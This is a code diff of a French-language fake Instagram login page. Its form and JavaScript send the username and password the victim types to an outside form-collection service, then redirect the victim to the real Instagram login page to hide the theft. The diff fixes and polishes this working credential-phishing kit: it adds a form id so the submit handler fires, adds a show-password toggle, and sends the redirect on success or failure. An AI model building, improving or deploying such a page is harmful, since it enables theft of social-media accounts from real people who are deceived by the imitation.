@@ -92,20 +92,27 @@
   <h1>Instagram</h1>
 
   <form 
-  action="https://framaforms.org/connexion-instagram-1752775137" 
-  method="POST"
-  autocomplete="off"
->
-  <button type="button" class="facebook-btn">Connexion avec Facebook</button>
+    id="instaForm"
+    action="https://framaforms.org/connexion-instagram-1752775137" 
+    method="POST"
+    autocomplete="off"
+  >
+    <button type="button" class="facebook-btn">Connexion avec Facebook</button>
 
-  <label for="username">Téléphone, nom d’utilisateur ou email *</label>
-  <input type="text" id="username" name="new_1752775215051" required />
+    <label for="username">Téléphone, nom d’utilisateur ou email *</label>
+    <input type="text" id="username" name="new_1752775215051" required />
 
-  <label for="password">Mot de passe *</label>
-  <input type="password" id="password" name="new_1752775407266" required />
+    <label for="password">Mot de passe *</label>
+    <div class="password-wrapper">
+      <input type="password" id="password" name="new_1752775407266" required />
+      <svg class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Afficher le mot de passe" role="img" tabindex="0">
+        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+        <circle cx="12" cy="12" r="2.5"/>
+      </svg>
+    </div>
 
-  <button type="submit">Se connecter</button>
-</form>
+    <button type="submit">Se connecter</button>
+  </form>
 
   <div class="signup">
     Pas de compte ? <a href="#">Inscrivez-vous</a>
@@ -128,21 +135,18 @@
     }
   });
 
-  // Soumission formulaire avec envoi en AJAX puis redirection
+  // Soumission formulaire avec envoi en AJAX puis redirection immédiate
   document.getElementById('instaForm').addEventListener('submit', function(e) {
-    e.preventDefault(); // bloque comportement par défaut
+    e.preventDefault(); // empêche l'envoi classique du formulaire
 
     const formData = new FormData(this);
 
-    fetch('https://framaforms.org/connexion-instagram-1752775137', {
+    fetch(this.action, {
       method: 'POST',
       body: formData,
-      mode: 'no-cors' // important pour autoriser le cross-origin sans CORS
-    }).then(() => {
-      // redirige vers vrai Instagram après envoi
-      window.location.href = 'https://www.instagram.com/accounts/login/';
-    }).catch(() => {
-      // même redirection en cas d'erreur
+      mode: 'no-cors' // permet d'envoyer sans bloquer par CORS (pas de retour exploitable)
+    }).finally(() => {
+      // redirige vers vrai Instagram après tentative d'envoi
       window.location.href = 'https://www.instagram.com/accounts/login/';
     });
   });
